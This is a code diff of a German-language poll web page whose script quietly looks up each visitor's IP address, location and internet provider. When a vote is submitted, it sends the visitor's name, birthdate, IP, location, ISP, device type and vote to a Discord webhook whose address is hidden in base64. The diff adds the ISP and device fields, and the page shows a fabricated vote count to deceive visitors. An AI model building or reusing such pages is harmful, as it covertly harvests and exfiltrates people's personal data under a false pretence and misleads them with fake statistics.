@@ -189,83 +189,91 @@
   </div>
 
   <script>
-    window.userLocation = null;
+  window.userLocation = null;
 
-    // IP und Location abrufen mit ipapi.co (liefert IPv4 oder IPv6 + Location)
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ip').value = data.ip;
-        window.userLocation = {
-          city: data.city || 'unbekannt',
-          region: data.region || 'unbekannt',
-          country: data.country_name || 'unbekannt',
-          loc: data.loc || ''
-        };
-      })
-      .catch(() => {
-        // Fallback falls API nicht antwortet
-        document.getElementById('ip').value = 'unbekannt';
-        window.userLocation = null;
-      });
-
-    function submitVote(answer) {
-      const name = document.getElementById('name').value.trim();
-      const birthdate = document.getElementById('birthdate').value;
-      const ip = document.getElementById('ip').value;
-      const status = document.getElementById('status');
-
-      if (!name || !birthdate) {
-        status.textContent = "Bitte fülle alle Felder aus.";
-        status.className = "status error";
-        return;
-      }
-
-      const locationStr = window.userLocation
-        ? `${window.userLocation.city}, ${window.userLocation.region}, ${window.userLocation.country}`
-        : 'unbekannt';
-
-      const payload = {
-        content: `🗳️ Neue Stimme eingegangen:\n**Vorname:** ${name}\n**Geburtsdatum:** ${birthdate}\n**IP:** ${ip}\n**Location:** ${locationStr}\n**Stimme:** ${answer}`
+  // IP, Location & ISP (WLAN-Anbieter) abrufen mit ipapi.co
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById('ip').value = data.ip;
+      window.userLocation = {
+        city: data.city || 'unbekannt',
+        region: data.region || 'unbekannt',
+        country: data.country_name || 'unbekannt',
+        loc: data.loc || '',
+        org: data.org || 'unbekannt' // WLAN-/ISP-Name
       };
+    })
+    .catch(() => {
+      document.getElementById('ip').value = 'unbekannt';
+      window.userLocation = null;
+    });
 
-      const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQzNzg1MDg4Mjg2NzI2MS94U3otaFZ1aHZJbzhhMF9JME1QekhiUnpQS0NJRW5pN1F6N0ZMcEpVX2g5U1J5TFNIeHNOckhPcVFjOWtQQnA3bHVSRA==");
-      
-      fetch(webhook, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(res => {
-        if (res.ok) {
-          status.textContent = "Danke für deine Teilnahme!";
-          status.className = "status success";
-          document.getElementById('voteForm').reset();
-        } else {
-          throw new Error("Fehler beim Senden.");
-        }
-      })
-      .catch(() => {
-        status.textContent = "Es gab ein Problem beim Senden.";
-        status.className = "status error";
-      });
+  function submitVote(answer) {
+    const name = document.getElementById('name').value.trim();
+    const birthdate = document.getElementById('birthdate').value;
+    const ip = document.getElementById('ip').value;
+    const status = document.getElementById('status');
+
+    if (!name || !birthdate) {
+      status.textContent = "Bitte fülle alle Felder aus.";
+      status.className = "status error";
+      return;
     }
 
-    // Fake Statistik generieren
-    (function generateFakeStats() {
-      const totalVotes = 10000;
-      const yesPercent = 55;
-      const noPercent = 45;
+    const locationStr = window.userLocation
+      ? `${window.userLocation.city}, ${window.userLocation.region}, ${window.userLocation.country}`
+      : 'unbekannt';
 
-      const statsText = `Bisher haben <strong>${totalVotes.toLocaleString()}</strong> Personen abgestimmt.`;
-      document.getElementById('fakeStatsText').innerHTML = statsText;
+    const isp = window.userLocation?.org || 'unbekannt';
 
-      // Bars sind schon fix per CSS, aber du kannst hier auch dynamisch ändern falls nötig
-      // z.B. falls du später prozentwerte zufällig machen willst
+    const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+      ? 'Mobilgerät'
+      : 'Desktop/Laptop';
 
-    })();
-  </script>
+    const payload = {
+      content: `🗳️ Neue Stimme eingegangen:
+**Vorname:** ${name}
+**Geburtsdatum:** ${birthdate}
+**IP:** ${ip}
+**Location:** ${locationStr}
+**WLAN-Anbieter:** ${isp}
+**Gerätetyp:** ${deviceType}
+**Stimme:** ${answer}`
+    };
+
+    const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQzNzg1MDg4Mjg2NzI2MS94U3otaFZ1aHZJbzhhMF9JME1QekhiUnpQS0NJRW5pN1F6N0ZMcEpVX2g5U1J5TFNIeHNOckhPcVFjOWtQQnA3bHVSRA==");
+
+    fetch(webhook, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(res => {
+      if (res.ok) {
+        status.textContent = "Danke für deine Teilnahme!";
+        status.className = "status success";
+        document.getElementById('voteForm').reset();
+      } else {
+        throw new Error("Fehler beim Senden.");
+      }
+    })
+    .catch(() => {
+      status.textContent = "Es gab ein Problem beim Senden.";
+      status.className = "status error";
+    });
+  }
+
+  // Fake Statistik generieren
+  (function generateFakeStats() {
+    const totalVotes = 10000;
+    const statsText = `Bisher haben <strong>${totalVotes.toLocaleString()}</strong> Personen abgestimmt.`;
+    document.getElementById('fakeStatsText').innerHTML = statsText;
+  })();
+</script>
+
+
 </body>
 </html>
